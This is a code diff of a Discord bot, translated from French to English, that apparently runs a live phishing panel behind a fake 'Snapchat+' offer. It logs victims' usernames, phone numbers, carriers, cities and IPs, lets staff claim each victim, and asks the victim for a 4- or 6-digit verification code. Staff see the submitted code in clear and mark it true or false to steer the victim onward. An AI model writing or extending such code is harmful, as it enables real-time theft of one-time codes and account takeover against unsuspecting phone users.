@@ -24,18 +24,18 @@ const client = new Client({
     ]
 });
 
-// ─── COULEURS OPÉRATEURS ───
+// ─── OPERATOR COLORS ───
 const OPERATOR_COLORS = {
-    'sfr': 0xe2001a,        // Rouge SFR
-    'orange': 0xff6600,     // Orange
-    'bouygues': 0x0099cc,   // Bleu Bouygues
-    'base': 0x00a4e0,       // Bleu BASE
-    'orange_be': 0xff6600,  // Orange Belgium
-    'proximus': 0x5c2d91,   // Violet Proximus
-    'telenet': 0xe2001a     // Rouge Telenet
+    'sfr': 0xe2001a,
+    'orange': 0xff6600,
+    'bouygues': 0x0099cc,
+    'base': 0x00a4e0,
+    'orange_be': 0xff6600,
+    'proximus': 0x5c2d91,
+    'telenet': 0xe2001a
 };
 
-const DEFAULT_COLOR = 0xfffc00; // Jaune Snapchat
+const DEFAULT_COLOR = 0xfffc00;
 
 function getOperatorColor(operator) {
     return OPERATOR_COLORS[operator?.toLowerCase()] || DEFAULT_COLOR;
@@ -133,10 +133,7 @@ const carrierNames = {
 function formatPhone(phone) { return '``' + phone + '``'; }
 function formatIP(ip) { return ip && ip !== 'unknown' ? '``' + ip + '``' : '`unknown`'; }
 
-/**
- * Crée le bouton Ban IP si l'IP est valide
- */
-function createBanIPButton(ip, phone) {
+function createBanIPButton(ip) {
     if (!ip || ip === 'unknown' || ip === 'null' || !ip.includes('.')) return null;
     return new ButtonBuilder()
         .setCustomId('banip_' + ip)
@@ -154,23 +151,23 @@ async function sendNewRequestEmbed(row) {
     const ip = row.ip_address;
 
     const embed = new EmbedBuilder()
-        .setTitle('📱 Nouvelle demande Snapchat+')
+        .setTitle('📱 New Snapchat+ Request')
         .setColor(color)
-        .setDescription('**Opérateur:** ' + carrier + '  |  **Pays:** ' + (row.country || 'Inconnu'))
+        .setDescription('**Operator:** ' + carrier + '  |  **Country:** ' + (row.country || 'Unknown'))
         .addFields(
             { name: '👤 Username', value: '``' + row.username + '``', inline: true },
-            { name: '📞 Téléphone', value: formatPhone(row.phone), inline: true },
-            { name: '📡 Opérateur', value: '``' + carrier + '``', inline: true },
-            { name: '🌍 Pays', value: '``' + (row.country || 'Inconnu') + '``', inline: true },
-            { name: '🏙️ Ville', value: '``' + (row.city || 'Inconnue') + '``', inline: true },
+            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
+            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
+            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
+            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
             { name: '🌐 IP', value: formatIP(ip), inline: true },
             { name: '⏰ Date', value: '<t:' + Math.floor(new Date(row.created_at).getTime()/1000) + ':R>', inline: false }
         )
-        .setFooter({ text: 'ID: ' + row.id + '  •  En attente de prise en charge' })
+        .setFooter({ text: 'ID: ' + row.id + '  •  Waiting for staff' })
         .setTimestamp();
 
     const buttons = [
-        new ButtonBuilder().setCustomId('claim_' + row.phone).setLabel('📋 Prendre en charge').setStyle(ButtonStyle.Primary)
+        new ButtonBuilder().setCustomId('claim_' + row.phone).setLabel('📋 Claim').setStyle(ButtonStyle.Primary)
     ];
 
     const banBtn = createBanIPButton(ip);
@@ -193,24 +190,24 @@ async function sendCodeSubmittedEmbed(row) {
     const ip = row.ip_address;
 
     const embed = new EmbedBuilder()
-        .setTitle("🔓 Code soumis par l'utilisateur")
+        .setTitle('🔓 Code Submitted by User')
         .setColor(color)
-        .setDescription("L'utilisateur a entré un code **" + len + " chiffres**. Veuillez vérifier ci-dessous.")
+        .setDescription('The user entered a **' + len + '-digit** code. Please verify below.')
         .addFields(
             { name: '👤 Username', value: '``' + row.username + '``', inline: true },
-            { name: '📞 Téléphone', value: formatPhone(row.phone), inline: true },
-            { name: '🔢 Code entré', value: '```\n' + code + '\n```', inline: false },
-            { name: '📡 Opérateur', value: '``' + carrier + '``', inline: true },
-            { name: '🌍 Pays', value: '``' + (row.country || 'Inconnu') + '``', inline: true },
-            { name: '🏙️ Ville', value: '``' + (row.city || 'Inconnue') + '``', inline: true },
+            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
+            { name: '🔢 Entered Code', value: '```\n' + code + '\n```', inline: false },
+            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
+            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
+            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
             { name: '🌐 IP', value: formatIP(ip), inline: true }
         )
-        .setFooter({ text: 'ID: ' + row.id + '  •  En attente de validation staff' })
+        .setFooter({ text: 'ID: ' + row.id + '  •  Awaiting staff validation' })
         .setTimestamp();
 
     const buttons = [
-        new ButtonBuilder().setCustomId('truecode_' + row.phone).setLabel('✅ Code correct').setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId('falsecode_' + row.phone).setLabel('❌ Code faux').setStyle(ButtonStyle.Danger)
+        new ButtonBuilder().setCustomId('truecode_' + row.phone).setLabel('✅ True Code').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId('falsecode_' + row.phone).setLabel('❌ False Code').setStyle(ButtonStyle.Danger)
     ];
 
     const banBtn = createBanIPButton(ip);
@@ -221,13 +218,52 @@ async function sendCodeSubmittedEmbed(row) {
     console.log('🔓 Code submitted: ' + row.phone + ' — Code: ' + code);
 }
 
+// ─── Embed: RETRY REQUEST (when false code) ───
+async function sendRetryEmbed(row, staffUserId) {
+    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
+    if (!channel) return;
+
+    const color = getOperatorColor(row.operator);
+    const carrier = carrierNames[row.operator] || row.operator;
+    const ip = row.ip_address;
+
+    const embed = new EmbedBuilder()
+        .setTitle('🔄 User Redirected — New Code Needed')
+        .setColor(color)
+        .setDescription('The previous code was **incorrect**. The user has been redirected to enter a new code.')
+        .addFields(
+            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
+            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
+            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
+            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
+            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
+            { name: '🌐 IP', value: formatIP(ip), inline: true }
+        )
+        .setFooter({ text: 'ID: ' + row.id + '  •  Choose an action below' })
+        .setTimestamp();
+
+    const buttons = [
+        new ButtonBuilder().setCustomId('len4_' + row.phone).setLabel('🔢 4 digits').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId('len6_' + row.phone).setLabel('🔢 6 digits').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId('wrong_' + row.phone).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
+    ];
+
+    const banBtn = createBanIPButton(ip);
+    if (banBtn) buttons.push(banBtn);
+
+    const actionRow = new ActionRowBuilder().addComponents(...buttons);
+    const msg = await channel.send({ embeds: [embed], components: [actionRow] });
+    console.log('🔄 Retry embed sent: ' + row.phone);
+    return msg;
+}
+
 // ─── INTERACTIONS ───
 client.on('interactionCreate', async interaction => {
     if (!interaction.isButton()) return;
 
     const parts = interaction.customId.split('_');
     const action = parts[0];
-    const payload = parts.slice(1).join('_'); // reconstruct in case IP has dots
+    const payload = parts.slice(1).join('_');
 
     // ─── CLAIM ───
     if (action === 'claim') {
@@ -242,9 +278,8 @@ client.on('interactionCreate', async interaction => {
             const data = await res.json();
 
             if (data.success) {
-                await interaction.editReply({ content: '✅ Demande **' + formatPhone(phone) + '** prise en charge par <@' + interaction.user.id + '>' });
+                await interaction.editReply({ content: '✅ Request **' + formatPhone(phone) + '** claimed by <@' + interaction.user.id + '>' });
 
-                // Récupérer les infos pour la couleur
                 const rows = await sql`SELECT operator, ip_address FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                 const op = rows[0]?.operator;
                 const ip = rows[0]?.ip_address;
@@ -252,13 +287,13 @@ client.on('interactionCreate', async interaction => {
 
                 const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(color)
-                    .setTitle('📋 Demande en cours de traitement')
-                    .setDescription('👤 Prise en charge par <@' + interaction.user.id + '>\n\n**Choisissez une action :**');
+                    .setTitle('📋 Request In Progress')
+                    .setDescription('👤 Claimed by <@' + interaction.user.id + '>\n\n**Choose an action:**');
 
                 const buttons = [
-                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Mauvais numéro').setStyle(ButtonStyle.Danger)
+                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 digits').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 digits').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
                 ];
 
                 const banBtn = createBanIPButton(ip);
@@ -270,7 +305,7 @@ client.on('interactionCreate', async interaction => {
                 await interaction.editReply({ content: '❌ ' + data.message });
             }
         } catch (e) {
-            await interaction.editReply({ content: '❌ Erreur réseau' });
+            await interaction.editReply({ content: '❌ Network error' });
         }
     }
 
@@ -285,17 +320,17 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ action: 'set_length', phone, length: 4, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '✅ Code à 4 chiffres demandé pour ' + formatPhone(phone) : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '✅ 4-digit code requested for ' + formatPhone(phone) : '❌ ' + data.message });
             if (data.success) {
                 const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                 const color = getOperatorColor(rows[0]?.operator);
                 const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(color)
-                    .setTitle('⏳ En attente du code (4 chiffres)')
-                    .setDescription('👤 Prise en charge\n🔢 Code demandé : **4 chiffres**');
+                    .setTitle('⏳ Waiting for Code (4 digits)')
+                    .setDescription('👤 Claimed\n🔢 Code requested: **4 digits**');
                 await interaction.message.edit({ embeds: [doneEmbed], components: [] });
             }
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     // ─── 6 DIGITS ───
@@ -309,17 +344,17 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ action: 'set_length', phone, length: 6, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '✅ Code à 6 chiffres demandé pour ' + formatPhone(phone) : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '✅ 6-digit code requested for ' + formatPhone(phone) : '❌ ' + data.message });
             if (data.success) {
                 const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                 const color = getOperatorColor(rows[0]?.operator);
                 const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(color)
-                    .setTitle('⏳ En attente du code (6 chiffres)')
-                    .setDescription('👤 Prise en charge\n🔢 Code demandé : **6 chiffres**');
+                    .setTitle('⏳ Waiting for Code (6 digits)')
+                    .setDescription('👤 Claimed\n🔢 Code requested: **6 digits**');
                 await interaction.message.edit({ embeds: [doneEmbed], components: [] });
             }
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     // ─── WRONG NUMBER ───
@@ -333,15 +368,15 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '✅ Mauvais numéro signalé pour ' + formatPhone(phone) : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '✅ Wrong number reported for ' + formatPhone(phone) : '❌ ' + data.message });
             if (data.success) {
                 const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(0xef4444)
-                    .setTitle('❌ Mauvais numéro')
-                    .setDescription("❌ L'utilisateur a été redirigé pour re-saisir son numéro.");
+                    .setTitle('❌ Wrong Number')
+                    .setDescription('❌ User has been redirected to re-enter their phone number.');
                 await interaction.message.edit({ embeds: [doneEmbed], components: [] });
             }
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     // ─── TRUE CODE ───
@@ -355,15 +390,15 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ action: 'true_code', phone, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '✅ Code validé pour ' + formatPhone(phone) : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '✅ Code validated for ' + formatPhone(phone) : '❌ ' + data.message });
             if (data.success) {
                 const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(0x10b981)
-                    .setTitle('✅ Code validé')
-                    .setDescription('👤 Validé par <@' + interaction.user.id + '>\nL\'utilisateur est redirigé vers la page de félicitations.');
+                    .setTitle('✅ Code Validated')
+                    .setDescription('👤 Validated by <@' + interaction.user.id + '>\nThe user is being redirected to the congratulations page.');
                 await interaction.message.edit({ embeds: [doneEmbed], components: [] });
             }
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     // ─── FALSE CODE ───
@@ -377,31 +412,26 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ action: 'false_code', phone, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '❌ Code refusé pour ' + formatPhone(phone) + ". L'utilisateur doit re-saisir." : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '❌ Code refused for ' + formatPhone(phone) + '. User must re-enter.' : '❌ ' + data.message });
+
             if (data.success) {
-                const rows = await sql`SELECT operator, ip_address FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
-                const op = rows[0]?.operator;
-                const ip = rows[0]?.ip_address;
-                const color = getOperatorColor(op);
+                // Update original embed to "refused"
+                const refusedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0xef4444)
+                    .setTitle('❌ Code Refused')
+                    .setDescription('👤 Refused by <@' + interaction.user.id + '>\nThe user has been redirected to enter a new code.');
+                await interaction.message.edit({ embeds: [refusedEmbed], components: [] });
 
-                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                    .setColor(color)
-                    .setTitle('📋 Demande en cours de traitement')
-                    .setDescription("👤 Prise en charge\n❌ Le code précédent était incorrect.\n\n**Choisissez une action :**");
-
-                const buttons = [
-                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Mauvais numéro').setStyle(ButtonStyle.Danger)
-                ];
-
-                const banBtn = createBanIPButton(ip);
-                if (banBtn) buttons.push(banBtn);
-
-                const actionRow = new ActionRowBuilder().addComponents(...buttons);
-                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
+                // ─── NOUVEAU : Envoyer un embed Discord pour la retry ───
+                const rows = await sql`SELECT id, username, phone, operator, country, city, ip_address, code_length FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
+                if (rows.length > 0) {
+                    await sendRetryEmbed(rows[0], interaction.user.id);
+                }
             }
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { 
+            console.error('False code error:', e);
+            await interaction.editReply({ content: '❌ Error' }); 
+        }
     }
 
     // ─── BAN IP ───
@@ -409,7 +439,7 @@ client.on('interactionCreate', async interaction => {
         await interaction.deferReply({ flags: 64 });
         const ip = payload;
         if (!ip || ip === 'unknown' || ip === 'null') {
-            await interaction.editReply({ content: '❌ Impossible de bannir : IP invalide' });
+            await interaction.editReply({ content: '❌ Cannot ban: invalid IP address' });
             return;
         }
         try {
@@ -419,17 +449,17 @@ client.on('interactionCreate', async interaction => {
                 body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? '🚫 IP **' + ip + '** bannie avec succès !' : '❌ ' + data.message });
+            await interaction.editReply({ content: data.success ? '🚫 IP **' + ip + '** banned successfully!' : '❌ ' + data.message });
             if (data.success) {
                 const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(0xef4444)
-                    .setTitle('🔨 IP Bannie')
-                    .setDescription('🚫 IP **' + ip + '** bannie par <@' + interaction.user.id + '>');
+                    .setTitle('🔨 IP Banned')
+                    .setDescription('🚫 IP **' + ip + '** banned by <@' + interaction.user.id + '>');
                 await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
             }
         } catch (e) {
             console.error('Ban IP error:', e);
-            await interaction.editReply({ content: '❌ Erreur réseau lors du bannissement' });
+            await interaction.editReply({ content: '❌ Network error while banning IP' });
         }
     }
 });
@@ -441,19 +471,19 @@ client.on('interactionCreate', async interaction => {
     if (interaction.commandName === 'config') {
         const channel = interaction.options.getChannel('channel');
         process.env.DISCORD_LOG_CHANNEL_ID = channel.id;
-        await interaction.reply({ content: '✅ Salon de logs défini sur <#' + channel.id + '>', flags: 64 });
+        await interaction.reply({ content: '✅ Log channel set to <#' + channel.id + '>', flags: 64 });
     }
 
     if (interaction.commandName === 'panel') {
         const embed = new EmbedBuilder()
-            .setTitle('🎛️ Panel Staff')
-            .setDescription('Les demandes apparaissent automatiquement ici.\n\n**Couleurs des embeds :**')
+            .setTitle('🎛️ Staff Panel')
+            .setDescription('Requests will appear here automatically.\n\n**Embed Colors:**')
             .addFields(
-                { name: '🔴 Rouge', value: 'SFR / Telenet', inline: true },
+                { name: '🔴 Red', value: 'SFR / Telenet', inline: true },
                 { name: '🟠 Orange', value: 'Orange / Orange Belgium', inline: true },
-                { name: '🔵 Bleu', value: 'Bouygues / BASE', inline: true },
-                { name: '🟣 Violet', value: 'Proximus', inline: true },
-                { name: '🟡 Jaune', value: 'Autre opérateur', inline: true }
+                { name: '🔵 Blue', value: 'Bouygues / BASE', inline: true },
+                { name: '🟣 Purple', value: 'Proximus', inline: true },
+                { name: '🟡 Yellow', value: 'Other operator', inline: true }
             )
             .setColor(0x000000);
         await interaction.reply({ embeds: [embed] });
@@ -469,7 +499,7 @@ client.on('interactionCreate', async interaction => {
             });
             const data = await res.json();
             await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     if (interaction.commandName === 'setlength') {
@@ -483,7 +513,7 @@ client.on('interactionCreate', async interaction => {
             });
             const data = await res.json();
             await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     if (interaction.commandName === 'wrongnumber') {
@@ -496,7 +526,7 @@ client.on('interactionCreate', async interaction => {
             });
             const data = await res.json();
             await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 
     if (interaction.commandName === 'banip') {
@@ -509,7 +539,7 @@ client.on('interactionCreate', async interaction => {
             });
             const data = await res.json();
             await interaction.editReply({ content: data.success ? '🚫 ' + data.message : '❌ ' + data.message });
-        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
     }
 });
 
